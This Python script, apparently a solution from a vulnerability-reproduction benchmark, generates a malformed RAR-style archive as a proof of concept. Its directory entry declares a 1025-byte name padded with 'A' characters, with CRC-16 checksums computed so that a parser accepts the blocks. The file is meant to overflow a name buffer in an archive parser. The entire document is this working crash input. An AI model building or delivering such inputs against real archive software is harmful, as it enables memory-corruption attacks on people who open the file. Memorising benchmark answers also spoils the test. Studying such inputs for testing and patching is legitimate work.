import struct

def init_crc_table():
    table = [0] * 256
    for i in range(256):
        c = i << 8
        for j in range(8):
            c = (c << 1) ^ (0x1021 if (c & 0x8000) else 0)
            c &= 0xffff
        table[i] = c
    return table

def compute_crc(data: bytes, table: list) -> int:
    crc = 0
    for byte in data:
        hi = (crc >> 8) & 0xff
        crc = ((crc << 8) ^ table[hi ^ byte]) & 0xffff
    return crc

class Solution:
    def solve(self, src_path: str) -> bytes:
        table = init_crc_table()
        sig = b'Rar!\x05\x00'

        # Main block: type 0, flags 0x40, size 7
        flags_main = 0x40
        size_main = 7
        content_main = struct.pack('B', 0) + struct.pack('B', flags_main) + struct.pack('<I', size_main)
        crc_main = compute_crc(content_main, table)
        main_block = struct.pack('<H', crc_main) + content_main

        # End block: type 0, flags 0x02, size 7
        flags_end = 0x02
        size_end = 7
        content_end = struct.pack('B', 0) + struct.pack('B', flags_end) + struct.pack('<I', size_end)
        crc_end = compute_crc(content_end, table)
        end_block = struct.pack('<H', crc_end) + content_end

        # File block: directory with large name_size=1025
        name_size = 1025
        fixed_size = 30  # dir fixed fields
        header_size = 6 + fixed_size + 2 + name_size  # 38 + name_size
        content_file = struct.pack('B', 1)  # type
        content_file += struct.pack('B', 0)  # flags
        content_file += struct.pack('<I', header_size)
        content_file += struct.pack('<I', 1)  # file_flags: directory
        content_file += struct.pack('<Q', 0)  # mtime
        content_file += struct.pack('<I', 0)  # crc
        content_file += struct.pack('<Q', 0)  # uncompressed size
        content_file += struct.pack('B', 0)  # host OS
        content_file += struct.pack('<I', 0x10)  # attributes: directory
        content_file += struct.pack('B', 0)  # compression method
        # no pack_size for directory
        content_file += struct.pack('<H', name_size)
        content_file += b'A' * name_size  # name data
        crc_file = compute_crc(content_file, table)
        file_block = struct.pack('<H', crc_file) + content_file

        poc = sig + main_block + file_block + end_block
        assert len(poc) == 1089
        return poc